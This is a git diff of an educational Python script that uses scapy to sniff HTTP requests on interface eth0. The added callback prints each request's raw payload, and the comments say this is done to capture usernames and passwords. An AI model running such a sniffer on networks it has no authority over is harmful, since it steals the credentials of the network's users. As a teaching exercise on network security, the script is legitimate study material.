@@ -1,9 +1,11 @@
 #!/usr/bin/env python
 
 import scapy.all as scapy
+from scapy.layers import http    # here we have imported the http package from the scapy module
+
 
 def sniff(interface):
-    scapy.sniff(iface = interface, store = False, prn =process_sniffed_packet, filter = "")  # Here sniff is the function in the scapy which accepts a lots of arguments but here we are just giving the interface to this function
+    scapy.sniff(iface = interface, store = False, prn = process_sniffed_packet)  # Here sniff is the function in the scapy which accepts a lots of arguments but here we are just giving the interface to this function
 # here we passed the another argument which is the store here we pass the value of the store as the false which means donot store the collected data because it will put the stress on our memory
 # this argument prn helps us to specify the callback function now what does callback function means a function which is called automatically whenever this function catches the new packet
 # so for the each packet capture it will call the another function specify in the prn
@@ -17,16 +19,16 @@ def sniff(interface):
 #     we looking for the data is send to web servers then we will use the port 80 because they will run on the port 80 by default
 
 # now there is a lot of ways to add the filters go there for more info    https://biot.com/capstats/bpf.html
-# now this filter doesnot work for the packets they has been send or recived through the http so in order to fix this we have to add the third party module in the python which is scapy_http we can install it by the command (pip install scapy_http)
+# now this filter doesnot work for the packets they has been send or recived through the http so in order to fix this we have to add the third party module in the python which is scapy_http we can install it by the command (pip install scapy_http) or (pip3 install scapy_http)
 
 
 
 
 
-def process_sniffed_packet(packet):                # here in the argument we will accept the packet which is searched by the scapy.sniff111
-    print(packet)
+# def process_sniffed_packet(packet):                # here in the argument we will accept the packet which is searched by the scapy.sniff111
+#     print(packet)
 
-sniff("eth0")
+# sniff("eth0")
 
 # now here what is happening lets see
 # here first of all we have passed the interface eth0 if you are on the other interface like lan0 you can use that interface but here i am passing the
@@ -35,3 +37,13 @@ sniff("eth0")
 #     through the interface passed in the iface
 # here we are also telling that donot store anything in the memory
 # then we are telling the function that for each piece of data you sniff call the another function called process_sniffed_packet()
+
+
+def process_sniffed_packet(packet):   # now here we want to print the packet which has the http request so lets add the if statement
+    if packet.haslayer(http.HTTPRequest):   # so here we are checking that packets has the http.HTTPRequest layer with the help of haslayer() function
+        # here we can add any layer like if the packet has ethernet layer but here we are checking for the if packets has the http layer
+        if packet.haslayer(scapy.Raw):  # here in the raw because we have the passwrods and usernames thats why we wrote this here
+            print(packet[scapy.Raw].load)   # here we are intrested to print only the raw layer with the load section only because raw layer has the passwords
+# scapy.Raw is the layer whereas the load is the field
+
+sniff("eth0")
